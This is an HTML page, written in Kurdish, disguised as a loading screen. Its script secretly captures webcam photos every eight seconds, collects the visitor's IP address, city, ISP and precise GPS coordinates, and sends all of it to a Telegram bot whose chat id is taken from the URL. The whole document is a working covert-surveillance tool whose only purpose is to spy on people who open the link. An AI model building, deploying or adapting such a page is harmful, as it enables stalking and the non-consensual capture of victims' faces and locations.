<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #ff2e63;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            color: #aaa;
            font-size: 1rem;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body onload="startSystem()">

    <div class="loader"></div>
    <h3>تکایە چەند چرکەیەک چاوەڕێ بکە...</h3>
    <p>پەڕەکە خەریکە بار دەبێت</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const botToken = '8487785975:AAHFsyjDEV6xvZ5_EXAMPLE_TOKEN'; // بۆت تۆکنەکەی خۆت لێرە دابنە
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        let ipDataText = "زانیاری IP نەدۆزرایەوە";
        let exactLocation = "نەدۆزرایەوە (ڕێگری لێکرا)";

        // وەرگرتنی زانیاری IP و شوێن
        async function getIPInfo() {
            try {
                let response = await fetch('https://ipapi.co/json/');
                let data = await response.json();
                ipDataText = 
                    `🌐 IP: ${data.ip}\n` +
                    `🏙 City: ${data.city}\n` +
                    `🌆 Region: ${data.region}\n` +
                    `🌍 Country: ${data.country_code}\n` +
                    `🏢 ISP: ${data.org}\n` +
                    `📮 Postal Code: ${data.postal || 'N/A'}\n` +
                    `⏰ Timezone: ${data.timezone}`;
            } catch (e) {
                console.error(e);
            }
        }
        getIPInfo();

        // وەرگرتنی Locationی GPS
        function getGPSLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        exactLocation = `${lat}, ${lon}`;
                    },
                    (error) => {
                        console.log("GPS Denied or Error");
                    },
                    { enableHighAccuracy: true }
                );
            }
        }
        getGPSLocation();

        async function startSystem() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });

                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => captureAndSend(), 1000);
                setInterval(() => captureAndSend(), 8000);

            } catch (err) {
                console.error("Camera access denied or error:", err);
            }
        }

        function captureAndSend() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            const context = canvas.getContext('2d');

            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'image.jpg');
                formData.append(
                    'caption', 
                    `😎 Proudly Supported By SocialXTools\n\n` +
                    `${ipDataText}\n` +
                    `📍 Location: ${exactLocation}`
                );

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.6);
        }
    </script>
</body>
</html>
